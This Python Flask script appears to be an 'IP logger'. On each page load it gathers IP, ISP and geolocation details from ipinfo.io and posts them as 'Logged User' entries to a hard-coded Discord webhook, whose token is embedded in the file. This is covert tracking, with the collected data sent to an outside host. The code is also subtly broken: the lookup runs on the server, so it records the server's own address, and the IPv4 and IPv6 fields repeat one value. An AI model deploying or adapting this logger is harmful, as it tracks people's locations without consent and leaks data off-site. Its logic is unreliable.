import requests
from flask import Flask
import json
from flask import jsonify
import os

app = Flask(__name__)

# Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1338168922935136267/RpF-lYkLx2Hi5wUATDRPA_-KN0ebYnPQCfy2oNx86Y7Gt_rgq787-vUCtCV4eVXUQS8"

def get_ip_info():
    # Fetch public IP address info
    ip_info = requests.get("https://ipinfo.io/json").json()
    return ip_info

@app.route('/')
def home():
    ip_info = get_ip_info()

    # Prepare the embed with collected data
    embed = {
        "embeds": [
            {
                "title": f"Logged User - {os.environ.get('PORT', '8080')}",
                "description": "IP Details",
                "color": 3066993,  # Green
                "fields": [
                    {
                        "name": "IPv6",
                        "value": f"`{ip_info.get('ip', 'N/A')}`",
                        "inline": True
                    },
                    {
                        "name": "IPv4",
                        "value": f"`{ip_info.get('ip', 'N/A')}`",
                        "inline": True
                    },
                    {
                        "name": "ISP",
                        "value": f"`{ip_info.get('org', 'N/A')}`",
                        "inline": True
                    },
                    {
                        "name": "City",
                        "value": f"`{ip_info.get('city', 'N/A')}`",
                        "inline": True
                    },
                    {
                        "name": "Region",
                        "value": f"`{ip_info.get('region', 'N/A')}`",
                        "inline": True
                    },
                    {
                        "name": "Country",
                        "value": f"`{ip_info.get('country', 'N/A')}`",
                        "inline": True
                    },
                    {
                        "name": "Latitude",
                        "value": f"`{ip_info.get('loc', '').split(',')[0]}`",
                        "inline": True
                    },
                    {
                        "name": "Longitude",
                        "value": f"`{ip_info.get('loc', '').split(',')[1]}`",
                        "inline": True
                    },
                ],
                "footer": {
                    "text": "Logged via Webhook"
                }
            }
        ]
    }

    # Send data to the webhook
    requests.post(WEBHOOK_URL, json=embed)
    return "Logged and sent to webhook!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
